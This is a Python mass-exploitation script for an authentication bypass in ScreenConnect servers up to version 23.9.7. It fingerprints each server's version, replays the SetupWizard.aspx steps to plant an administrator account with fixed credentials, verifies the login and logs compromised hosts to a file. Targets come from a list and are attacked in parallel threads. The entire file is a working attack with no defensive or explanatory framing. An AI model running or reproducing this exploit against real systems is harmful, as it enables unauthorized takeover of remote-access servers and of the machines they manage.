import re
import urllib3
import requests
import threading
from distutils.version import LooseVersion
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings()

GREEN = "\033[92m"
RESET = "\033[0m"

exploit_header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
}

def exploit(url, username, password, domain):
    if checkVersion(url):
        try:
            initial_request = requests.get(url=url + "/SetupWizard.aspx/", verify=False)
            viewstate_1 = re.search(r'value="([^"]+)"', initial_request.text).group(1)
            viewgen_1 = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', initial_request.text).group(1)
            next_data = {"__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": viewstate_1,
                         "__VIEWSTATEGENERATOR": viewgen_1,
                         "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"}
            next_request = requests.post(url=url + "/SetupWizard.aspx/", headers=exploit_header, data=next_data, verify=False)
            exploit_viewstate = re.search(r'value="([^"]+)"', next_request.text).group(1)
            exploit_viewgen = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', next_request.text).group(1)
            exploit_data = {"__LASTFOCUS": '', "__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": exploit_viewstate,
                            "__VIEWSTATEGENERATOR": exploit_viewgen, "ctl00$Main$wizard$userNameBox": username,
                            "ctl00$Main$wizard$emailBox": username + f"@{domain}",
                            "ctl00$Main$wizard$passwordBox": password, "ctl00$Main$wizard$verifyPasswordBox": password,
                            "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"}
            requests.post(url=url + "/SetupWizard.aspx/", headers=exploit_header, data=exploit_data, verify=False)
            check_url = url + "/Services/AuthenticationService.ashx/TryLogin"
            check_data = f"""["{username}","{password}",null,null,null]"""
            check_header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "Content-Type": "application/json"
            }
            check_response = requests.post(url=check_url, data=check_data, headers=check_header, verify=False)
            if check_response.ok and "1" in check_response.text:
                print(f"[+] {url} Successfully added user. username: {GREEN}{username}{RESET} and password: {GREEN}{password}{RESET}")
                with open("success.txt", "a+") as success_file:
                    success_file.write(url + "\n")
                success_file.close()
        except:
            pass

def checkVersion(url):
    try:
        response = requests.get(url=url + "/Login?Reason=0", headers=exploit_header, verify=False)
        serverString = response.headers["Server"]
        version = re.search(r"ScreenConnect\/([\d\.]+)-\d+", serverString).group(1)
        if LooseVersion(version) <= LooseVersion("23.9.7"):
            return True
        else:
            return False
    except:
        return False

def main():
    with open("maybe-exploit.txt", "r") as file:
        urls = file.readlines()
    username = "cvetest"
    password = "cvetest@2023"
    # Fill it in casually, for example: poc.com
    domain = "poc.com"
    threads = []
    for url in urls:
        url = url.strip()
        thread = threading.Thread(target=exploit, args=(url, username, password, domain))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
